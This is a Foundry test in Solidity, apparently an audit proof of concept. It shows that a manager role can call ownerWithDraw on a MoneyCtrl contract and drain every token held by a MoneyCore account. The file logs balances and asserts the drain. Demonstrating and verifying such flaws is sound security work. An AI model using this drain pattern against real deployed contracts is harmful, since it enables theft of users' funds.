// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoneyCore.sol";
import "../src/MoneyCore.sol";

contract MoneyStateUpdateTest is Test {
    MoneyCore moneyCore;
    MoneyCtrl moneyCtrl;
    address deployer;
    address manager;
    address validAccount = address(0x1);
    uint256 initialSupply = 1000 * 10**18;

    bytes32 constant MANAGER_ROLE = keccak256("MANAGER_ROLE");
    bytes32 constant CONTROL_ROLE = keccak256("CONTROL_ROLE");

    function setUp() public {
        deployer = address(this);
        manager = address(0x100);

        // Deploy MoneyCore
        moneyCore = new MoneyCore(initialSupply, validAccount);

        // Transfer tokens to validAccount
        moneyCore.transfer(validAccount, initialSupply / 2);

        // Deploy MoneyCtrl
        moneyCtrl = new MoneyCtrl(address(moneyCore));

        // Grant roles
        vm.startPrank(deployer);
        moneyCore.grantRole(CONTROL_ROLE, address(moneyCtrl)); // Allow MoneyCtrl to withdraw
        moneyCtrl.grantRole(MANAGER_ROLE, manager); // Make manager a MANAGER_ROLE holder
        vm.stopPrank();
    }

    function testMaliciousManagerCanWithdraw() public {
        uint256 amount = initialSupply / 2;

        // Pre-attack balances
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 validAccountBalanceBefore = moneyCore.balanceOf(validAccount);
        uint256 managerBalanceBefore = moneyCore.balanceOf(manager);
        console.log("validAccount balance:", validAccountBalanceBefore, "tokens");
        console.log("manager balance:", managerBalanceBefore, "tokens");
        console.log("");
        
        // Trigger attack operation
        console.log("--- Trigger ownerWithDraw ---");
        vm.prank(manager);
        moneyCtrl.ownerWithDraw(manager, amount);
        console.log("Called ownerWithDraw with amount:", amount);
        console.log("");
        
        // Post-attack balances
        console.log("--- AFTER-Trigger Balances ---");
        uint256 validAccountBalanceAfter = moneyCore.balanceOf(validAccount);
        uint256 managerBalanceAfter = moneyCore.balanceOf(manager);
        console.log("validAccount balance:", validAccountBalanceAfter, "tokens");
        console.log("manager balance:", managerBalanceAfter, "tokens");
        console.log("");
        
        // Vulnerability verification
        console.log("--- Vulnerability Verification ---");
        bool accountBalanceDrained = validAccountBalanceAfter == 0;
        bool managerBalanceIncreased = managerBalanceAfter == amount;
        bool attackSuccess = accountBalanceDrained && managerBalanceIncreased;
        
        console.log("Account balance drained:", accountBalanceDrained ? "YES" : "NO");
        console.log("Manager balance increase:", managerBalanceIncreased ? "CORRECT" : "WRONG");
        
        // Final vulnerability conclusion
        if (attackSuccess) {
            console.log("Vulnerability Exists: Malicious manager can withdraw all tokens from validAccount");
        } else {
            console.log("Vulnerability not Exist: Security mechanism prevents unauthorized withdrawal");
        }

        // Original assertions for test validity
        assertEq(managerBalanceAfter, amount, "Manager should receive tokens");
        assertEq(validAccountBalanceAfter, 0, "Account should be drained");
    }
}